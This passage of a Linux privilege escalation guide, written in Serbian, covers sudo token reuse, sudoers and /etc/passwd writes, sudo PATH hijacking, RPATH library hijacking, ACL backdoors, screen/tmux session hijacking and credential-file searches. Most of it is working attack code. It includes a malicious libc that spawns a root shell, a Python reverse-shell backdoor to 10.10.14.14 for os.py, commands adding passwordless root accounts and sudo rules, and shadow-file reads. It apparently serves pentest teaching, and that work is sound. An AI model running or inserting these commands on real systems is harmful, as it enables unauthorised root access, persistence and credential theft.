- **Drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **owned by root with setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u folderu ili na bilo kojoj od datoteka kreiranih unutar tog foldera, možete koristiti binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete overwrite-ovati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku radeći:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. Ovi fajlovi **po defaultu mogu biti čitani samo od strane korisnika root i grupe root**.\
**Ako** možete **pročitati** ovaj fajl mogli biste uspeti da **dobijete neke zanimljive informacije**, a ako možete **pisati** bilo koji fajl bićete u mogućnosti da **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možete da pišete, možete zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje alternative za binarni `sudo`, poput `doas` na OpenBSD — obavezno proverite njegovu konfiguraciju u `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** da bi eskalirao privilegije i dobili ste shell u tom korisničkom kontekstu, možete **napraviti novi sudo izvršni fajl** koji će pokrenuti vaš kod kao root, a zatim i korisnikovu komandu. Zatim **izmenite $PATH** korisničkog konteksta (na primer dodavanjem nove putanje u .bash_profile) tako da kada korisnik pokrene sudo, izvršiće se vaš sudo izvršni fajl.

Imajte na umu da ako korisnik koristi drugi shell (ne bash), biće potrebno izmeniti druge fajlove da biste dodali novu putanju. Na primer [sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete naći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljene biblioteke

### ld.so

Fajl `/etc/ld.so.conf` ukazuje **odakle su učitani konfiguracioni fajlovi**. Obično, ovaj fajl sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će se čitati konfiguracioni fajlovi iz `/etc/ld.so.conf.d/*.conf`. Ovi konfiguracioni fajlovi **pokazuju na druge foldere** gde će se **biblioteke** tražiti. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za pisanje** na bilo kom od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kom fajlu unutar `/etc/ld.so.conf.d/` ili bilo kojoj fascikli koju navodi konfiguracioni fajl unutar `/etc/ld.so.conf.d/*.conf` on može biti u mogućnosti da escalate privileges.\
Pogledajte **how to exploit this misconfiguration** na sledećoj strani:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/`, ona će biti korišćena od strane programa na ovom mestu kako je specificirano u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` koristeći `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities pružaju **podskup dostupnih root privilegija procesu**. Ovo efikasno razlaže root **privilegije u manje i različite jedinice**. Svaka od ovih jedinica se može nezavisno dodeliti procesima. Na ovaj način se smanjuje ukupan skup privilegija, čime se umanjuju rizici od eksploatacije.\
Pročitajte sledeću stranu da **saznate više o capabilities i kako ih zloupotrebiti**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "execute"** implicira da pogođeni korisnik može "**cd**" u folder.\
**"read"** bit implicira da korisnik može **listati** **fajlove**, a **"write"** bit implicira da korisnik može **brisati** i **kreirati** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **nadjača tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima dozvoljavajući ili odbijajući prava određenim korisnicima koji nisu vlasnici ili članovi grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Dalji detalji dostupni su [**ovde**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodelite** korisniku "kali" dozvole za čitanje i pisanje nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dobavi** datoteke sa određenim ACLs iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Skriveni ACL backdoor na sudoers drop-ins

Česta pogrešna konfiguracija je fajl u vlasništvu root-a u `/etc/sudoers.d/` sa modom `440` koji i dalje daje write pristup low-priv korisniku preko ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ako vidite nešto poput `user:alice:rw-`, korisnik može dodati sudo pravilo uprkos restriktivnim bitovima dozvola:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Ovo je ACL persistence/privesc putanja visokog uticaja, jer se lako previdi pri revizijama koje koriste samo `ls -l`.

## Otvorene shell sesije

U **starijim verzijama** možete **hijack** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da se **povežete** samo na screen sesije vašeg **svojeg korisnika**. Međutim, možete pronaći **zanimljive informacije unutar sesije**.

### screen sessions hijacking

**Prikaži screen sesije**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Poveži se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Otimanje tmux sesija

Ovo je bio problem sa **starim verzijama tmux-a**. Nisam uspeo da otmem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovan korisnik.

**Prikaži tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključite se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Došlo je do ovog propusta prilikom kreiranja novog ssh ključa na tim OS-ovima, jer je bilo moguće samo **32,768 variations**. To znači da sve mogućnosti mogu biti izračunate i **imajući ssh public key možete potražiti odgovarajući private key**. Možete pronaći izračunate mogućnosti ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Zanimljive konfiguracione vrednosti

- **PasswordAuthentication:** Određuje da li je autentifikacija lozinkom dozvoljena. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je autentifikacija putem public key dozvoljena. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je password authentication dozvoljena, određuje da li server dozvoljava prijavu na nalozima sa praznim lozinkama. Podrazumevano je `no`.

### Login control files

These files influence who can log in and how:

- **`/etc/nologin`**: if present, blocks non-root logins and prints its message.
- **`/etc/securetty`**: restricts where root can log in (TTY allowlist).
- **`/etc/motd`**: post-login banner (can leak environment or maintenance details).

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će pokazati da, ako pokušate da se prijavite koristeći **private** key korisnika "**testusername**", ssh će uporediti public key vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **use your local SSH keys instead of leaving keys** (without passphrases!) koje ostanu na vašem serveru. Dakle, moći ćete da **jump** putem ssh **to a host** i odatle **jump to another** host **using** the **key** koja se nalazi na vašem **initial host**.

Potrebno je да podesite ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` postavljen na `*`, svaki put kada korisnik prebaci na drugu mašinu, taj host će moći da pristupi ključevima (što predstavlja sigurnosni problem).

Fajl `/etc/ssh_config` može **prebrisati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može pomoću direktive `AllowAgentForwarding` **dozvoliti** ili **zabraniti** ssh-agent forwarding (podrazumevano je dozvoljeno).

Ako utvrdite da je Forward Agent konfigurisano u okruženju, pročitajte sledeću stranicu jer **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljive datoteke

### Datoteke profila

Fajl `/etc/profile` i fajlovi u direktorijumu `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Dakle, ako možete **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka neobična profilna skripta, trebalo bi je proveriti zbog **osetljivih podataka**.

### Passwd/Shadow fajlovi

U zavisnosti od OS-a fajlovi `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati rezervna kopija. Zato se preporučuje da **pronađete sve** i **proverite da li možete da ih pročitate** kako biste videli **da li u fajlovima postoje hashovi**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u `/etc/passwd` (ili ekvivalentnom fajlu)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo, generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i postavite generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Npr: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: možete narušiti trenutni nivo bezbednosti mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi u `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete da **pišete u neke osetljive fajlove**. Na primer, možete li da pišete u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **izmeniti Tomcat konfiguracioni fajl servisa unutar /etc/systemd/,** onda možete izmeniti sledeće linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će biti izvršen sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu sadržavati backups ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobična lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjene datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB datoteke
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml datoteke
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binarni fajlovi u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Veb fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **više mogućih datoteka koje bi mogle sadržati lozinke**.\
**Još jedan interesantan alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je open source aplikacija koja se koristi za vraćanje velikog broja lozinki sačuvanih na lokalnom računaru za Windows, Linux & Mac.

### Logovi

Ako možete čitati logove, možda ćete moći pronaći **interesantne/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki **"loše"** konfigurisani (backdoored?) **audit logovi** mogu vam omogućiti da **zabeležite lozinke** unutar audit logova, kako je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste **čitali logove**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti od velike pomoći.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Treba takođe da proverite fajlove koji u svom imenu ili sadržaju sadrže reč "**password**", kao i da proverite IP adrese i emailove u logovima, ili regex-e za hashe.\
Neću ovde nabrajati kako se sve ovo radi, ali ako vas zanima možete pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Upisivi fajlovi

### Python library hijacking

Ako znate sa **kog mesta** će se python skripta izvršavati i **možete da pišete** u tom folderu ili možete **izmeniti python libraries**, možete izmeniti OS library i ubaciti backdoor (ako možete pisati tamo gde će se python skripta izvršavati, kopirajte i nalepite os.py).

Da biste **backdoor the library**, jednostavno dodajte na kraj os.py library sledeću liniju (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacija

Ranljivost u `logrotate` dozvoljava korisnicima sa **dozvole za pisanje** na log fajl ili na njegove roditeljske direktorijume da potencijalno dobiju eskalirane privilegije. To je zato što se `logrotate`, često pokrenut kao **root**, može manipulisati da izvršava proizvoljne fajlove, posebno u direktorijumima poput _**/etc/bash_completion.d/**_. Važno je proveriti permisije ne samo u _/var/log_, već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` verziju `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Možete iskoristiti ovu ranjivost pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je vrlo slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god ustanovite da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete eskalirati privilegije zamenom logova symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **zapiše** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može da **izmeni** postojeću, onda je vaš **system is pwned**.

Network skripte, npr. _ifcg-eth0_, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su ~sourced~ na Linuxu od strane Network Manager (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network skriptama nije ispravno obrađen. Ako imate **razmak u imenu, sistem pokušava da izvrši deo posle razmaka**. To znači da se **sve posle prvog razmaka izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Napomena: prazni razmak između Network i /bin/id_)

### **init, init.d, systemd, i rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasičan sistem za upravljanje servisima u Linuxu**. Uključuje skripte za `start`, `stop`, `restart` i ponekad `reload` servisa. One se mogu izvršavati direktno ili preko simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

Sa druge strane, `/etc/init` je povezan sa **Upstart**, novijim sistemom za upravljanje servisima koji je uveo Ubuntu, koristeći konfiguracione fajlove za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstart-u.

**systemd** se pojavljuje kao moderan init i menadžer servisa, nudeći napredne funkcije kao što su pokretanje daemona na zahtev, upravljanje automount-ovima i snapshot-ovi stanja sistema. On organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, pojednostavljujući proces administracije sistema.

## Ostali trikovi

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hook-uju syscall kako bi izložili privilegovanu kernel funkcionalnost userspace manageru. Slaba autentifikacija managera (npr. provere potpisa zasnovane na FD-order ili loše password sheme) može omogućiti lokalnoj aplikaciji da se pretvara da je manager i eskalira privilegije do root-a na uređajima koji su već root-ovani. Saznajte više i detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Service discovery zasnovan na regex-u u VMware Tools/Aria Operations može izdvojiti putanju binarnog fajla iz komandne linije procesa i izvršiti ga sa -v u privilegovanom kontekstu. Permisivni paterni (npr. korišćenjem \S) mogu poklopiti listener-e koje je napadač postavio u lokacijama gde je dozvoljeno pisanje (npr. /tmp/httpd), što dovodi do izvršenja kao root (CWE-426 Untrusted Search Path).

Saznajte više i pogledajte generalizovani obrazac primenjiv na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel sigurnosne zaštite

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
